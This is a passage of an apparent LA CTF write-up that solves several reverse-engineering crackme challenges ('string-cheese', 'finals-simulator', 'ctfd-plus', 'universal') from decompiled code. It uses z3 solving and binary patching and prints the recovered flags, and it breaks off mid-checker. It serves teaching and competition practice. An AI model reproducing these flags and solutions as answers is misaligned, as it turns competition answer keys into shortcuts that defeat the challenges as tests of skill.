flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[0] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1 
flag[-~-~-~-~--1] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~--1
print(flag)
# lactf{th3_hungry_l1ttl3_c4t3rp1ll4r_at3_th3_fl4g_4g41n}
```

### string-cheese
#### Challenge:
(IDA decompiled)
```c
int print_flag()
{
  char s[264]; // [rsp+0h] [rbp-110h] BYREF
  FILE *stream; // [rsp+108h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("Cannot read flag.txt.");
  fgets(s, 256, stream);
  s[strcspn(s, "\n")] = 0;
  return puts(s);
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[256]; // [rsp+0h] [rbp-100h] BYREF

  printf("What's my favorite flavor of string cheese? ");
  fflush(_bss_start);
  fgets(s, 256, stdin);
  s[strcspn(s, "\n")] = 0;
  if ( !strcmp(s, "blueberry") )
  {
    puts("...how did you know? That isn't even a real flavor...");
    puts("Well I guess I should give you the flag now...");
    print_flag();
  }
  else
  {
    puts("Hmm... I don't think that's quite it. Better luck next time!");
  }
  return 0;
}
```
#### Solution:
```shell
echo blueberry | ./string_cheese
```

### finals-simulator
#### Challenge:
(IDA decompiled)
```c
int print_flag()
{
  char s[264]; // [rsp+0h] [rbp-110h] BYREF
  FILE *stream; // [rsp+108h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("Cannot read flag.txt.");
  fgets(s, 256, stream);
  s[strcspn(s, "\n")] = 0;
  return puts(s);
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-114h] BYREF
  char s[264]; // [rsp+10h] [rbp-110h] BYREF
  char *i; // [rsp+118h] [rbp-8h]

  puts("Welcome to Finals Simulator 2023: Math Edition!");
  printf("Question #1: What is sin(x)/n? ");
  fflush(stdout);
  fgets(s, 256, stdin);
  s[strcspn(s, "\n")] = 0;
  if ( !strcmp(s, "six") )
  {
    printf("Question #2: What's the prettiest number? ");
    fflush(stdout);
    __isoc99_scanf("%d", &v4);
    if ( 42 * (v4 + 88) == 561599850 )
    {
      printf("Question #3: What's the integral of 1/cabin dcabin? ");
      fflush(stdout);
      getchar();
      fgets(s, 256, stdin);
      s[strcspn(s, "\n")] = 0;
      for ( i = s; *i; ++i )
        *i = 17 * *i % mod;
      putchar(10);
      if ( !strcmp(s, &enc) )
      {
        puts("Wow! A 100%! You must be really good at math! Here, have a flag as a reward.");
        print_flag();
      }
      else
      {
        puts("Wrong! You failed.");
      }
      return 0;
    }
    else
    {
      puts("Wrong! You failed.");
      return 0;
    }
  }
  else
  {
    puts("Wrong! You failed.");
    return 0;
  }
}
```
#### Solution:
The first one is easy, you just need to send "six";

The second is also easy, just a basic linear equation. If you don't want to solve it, use z3-solver and type:
```py
import z3
v4 = z3.Int('v4')
s = z3.Solver()
s.add(42 * (v4 + 88) == 561599850)
if s.check() == z3.sat:
	v4 = s.model().eval(v4).as_long()
	print(v4)
```
it will tell you the answer.

The third one is the main part of this challenge. First, export the value of `mod` and the data of `enc`(it's located at the .data section, with the address of 0x3080 and ends with a zero byte `0x00`). You can use hex editors like `010editor` or command `dd` to do this. Then use z3-solver again to solve the equations:
```py
enc = bytearray.fromhex("""0E C9 9D B8 26 83 26 41 74 E9 26 A5 83 94 0E 63 37 37 37""")
n = len(enc)
mod = 0xFD
import z3
flag = [z3.Int(f'flag_{i}') for i in range(n)]
s = z3.Solver()
s.add([17*flag[i]%mod==enc[i] for i in range(n)])
if s.check() == z3.sat:
	flag = bytes([s.model().eval(flag[i]).as_long() for i in range(n)]).decode()
	print(flag)
else:
	print('unsat')
```
finally, send them to remote server by `nc` and getflag:
```plaintext
six
13371337
it's a log cabin!!!

# lactf{im_n0t_qu1t3_sur3_th4ts_h0w_m4th_w0rks_bu7_0k}
```

### ctfd-plus
#### Challenge:
```c
__int64 __fastcall sub_1230(unsigned int a1)
{
  int v1; // eax
  int i; // ecx
  int v3; // edi

  v1 = 0;
  for ( i = 0; i != 32; ++i )
  {
    v3 = __ROR4__(a1 * a1, i);
    a1 = v1 ^ (4919 * v3 + 69210935);
    v1 += 322376503;
  }
  return HIBYTE(a1) + a1 + HIWORD(a1) + (a1 >> 8);
}
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  size_t v3; // rax
  __int64 v4; // rsi
  unsigned int *v5; // r8
  char v7[264]; // [rsp+0h] [rbp-108h] BYREF

  puts("Welcome to CTFd+!");
  puts("So far, we only have one challenge, which is one more than the number of databases we have.\n");
  puts("Very Doable Pwn - 500 points, 0 solves");
  puts("Can you help me pwn this program?");
  puts("#include <stdio.h>\nint main(void) {\n    puts(\"Bye!\");\n    return 0;\n}\n");
  puts("Enter the flag:");
  fgets(v7, 256, stdin);
  v3 = strcspn(v7, "\n");
  v4 = 0LL;
  v5 = (unsigned int *)&unk_4060;
  v7[v3] = 0;
  do
  {
    if ( (unsigned __int8)sub_1230(v5[v4]) != v7[v4] )
    {
      puts("Incorrect flag.");
      return 0LL;
    }
    ++v4;
  }
  while ( v4 != 47 );
  puts("You got the flag! Unfortunately we don't exactly have a database to store the solve in...");
  return 0LL;
}
```
#### Solution:
I used dynamic debugging and set breakpoint at the if statement (patched `return 0LL;` to `NOP`).
You can also use hook or re-compile the program to output the flag.
```plaintext
lactf{m4yb3_th3r3_1s_s0m3_m3r1t_t0_us1ng_4_db}
```
### universal

#### Challenge:
(decompiled by jadx)
```java
package defpackage;

import java.nio.charset.Charset;
import java.util.Scanner;

/* renamed from: FlagChecker  reason: default package */
/* loaded from: FlagChecker.class */
class FlagChecker {
    FlagChecker() {
    }

    public static void main(String[] strArr) {
        System.out.print("What's the flag? ");
        System.out.flush();
        Scanner scanner = new Scanner(System.in);
        String nextLine = scanner.nextLine();
        scanner.close();
        byte[] bytes = nextLine.getBytes(Charset.forName("UTF-8"));
        if (bytes.length == 38 && (((bytes[34] ^ (bytes[23] * 7)) ^ ((bytes[36] ^ (-1)) + 13)) & 255) == 182 && (((bytes[37] ^ (bytes[10] * 7)) ^ ((bytes[21] ^ (-1)) + 13)) & 255) == 223 && (((bytes[24] ^ (bytes[23] * 7)) ^ ((bytes[19] ^ (-1)) + 13)) & 255) == 205 && (((bytes[25] ^ (bytes[13] * 7)) ^ ((bytes[23] ^ (-1)) + 13)) & 255) == 144 && (((bytes[6] ^ (bytes[27] * 7)) ^ ((bytes[25] ^ (-1)) + 13)) & 255) == 138 && (((bytes[4] ^ (bytes[32] * 7)) ^ ((bytes[22] ^ (-1)) + 13)) & 255) == 227 && (((bytes[25] ^ (bytes[19] * 7)) ^ ((bytes[1] ^ (-1)) + 13)) & 255) == 107 && (((bytes[22] ^ (bytes[7] * 7)) ^ ((bytes[29] ^ (-1)) + 13)) & 255) == 85 && (((bytes[15] ^ (bytes[10] * 7)) ^ ((bytes[20] ^ (-1)) + 13)) & 255) == 188 && (((bytes[29] ^ (bytes[16] * 7)) ^ ((bytes[12] ^ (-1)) + 13)) & 255) == 88 && (((bytes[35] ^ (bytes[4] * 7)) ^ ((bytes[33] ^ (-1)) + 13)) & 255) == 84 && (((bytes[36] ^ (bytes[2] * 7)) ^ ((bytes[4] ^ (-1)) + 13)) & 255) == 103 && (((bytes[26] ^ (bytes[3] * 7)) ^ ((bytes[1] ^ (-1)) + 13)) & 255) == 216 && (((bytes[12] ^ (bytes[6] * 7)) ^ ((bytes[18] ^ (-1)) + 13)) & 255) == 165 && (((bytes[12] ^ (bytes[28] * 7)) ^ ((bytes[36] ^ (-1)) + 13)) & 255) == 151 && (((bytes[20] ^ (bytes[0] * 7)) ^ ((bytes[21] ^ (-1)) + 13)) & 255) == 101 && (((bytes[27] ^ (bytes[36] * 7)) ^ ((bytes[14] ^ (-1)) + 13)) & 255) == 248 && (((bytes[35] ^ (bytes[2] * 7)) ^ ((bytes[19] ^ (-1)) + 13)) & 255) == 44 && (((bytes[13] ^ (bytes[11] * 7)) ^ ((bytes[33] ^ (-1)) + 13)) & 255) == 242 && (((bytes[33] ^ (bytes[11] * 7)) ^ ((bytes[3] ^ (-1)) + 13)) & 255) == 235 && (((bytes[31] ^ (bytes[37] * 7)) ^ ((bytes[29] ^ (-1)) + 13)) & 255) == 248 && (((bytes[1] ^ (bytes[33] * 7)) ^ ((bytes[31] ^ (-1)) + 13)) & 255) == 33 && 